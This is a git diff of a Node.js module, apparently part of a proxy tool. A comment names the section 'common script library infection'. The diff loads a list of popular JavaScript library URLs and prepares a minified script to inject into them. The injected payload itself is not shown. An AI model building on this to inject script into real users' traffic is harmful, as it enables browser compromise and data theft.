@@ -1,14 +1,17 @@
 ﻿'use strict';
 
-var proxyDns = require('./proxy_dns.js'),
-	proxyWeb = require('./proxy_web.js'),
+var config = require('./config.json'),
+	fs = require('fs'),
 	iconv = require('iconv-lite'),
-	config = require('./config.json'),
-	fs = require('fs');
+	proxyWeb = require('./proxy_web.js');
+
 
 
 function Read(path) {
-	return fs.readFileSync(path) + '';
+	try {
+		return fs.readFileSync(path) + '';
+	}
+	catch(e) {}
 }
 
 
@@ -17,7 +20,7 @@ function Read(path) {
 // ------------------------------
 // 常用脚本库感染
 // ------------------------------
-var jslib_list = [];
+var jslib_list = require('./asset/commlib/list.json');
 var jslib_map = {};
 var INJECT_JS;
 
@@ -39,28 +42,41 @@ fs.watch(INJECT_FILE, function() {
 });
 
 function updateInjectJs() {
-	try {
-		INJECT_JS = Read(INJECT_FILE).
-		    replace('$LIST', jslib_list.join('|'));
+	INJECT_JS = Read(INJECT_FILE);
+	if (!INJECT_JS) {
+		return;
 	}
-	catch(e) {
+
+	//
+	// 填充常用脚本列表
+	//
+	INJECT_JS = INJECT_JS.replace('$LIST', jslib_list.join('|'));
+
+	//
+	// 调试状态下不压缩脚本
+	//
+	if (!config.debug) {
+		INJECT_JS = require('uglify-js')
+			.minify(INJECT_JS, {fromString: true}).code;
 	}
 }
 
 
 // 载入常用脚本库url
-var LIB_LIST = './asset/commlib/list.txt';
-
 function parseList() {
-	jslib_list = Read(LIB_LIST).split('\n');
-
 	jslib_list.forEach(function(url) {
 		jslib_map[url] = true;
 	});
 
 	updateInjectJs();
 }
-parseList();
+
+
+
+
+exports.init = function() {
+	parseList();
+};
 
 
 //
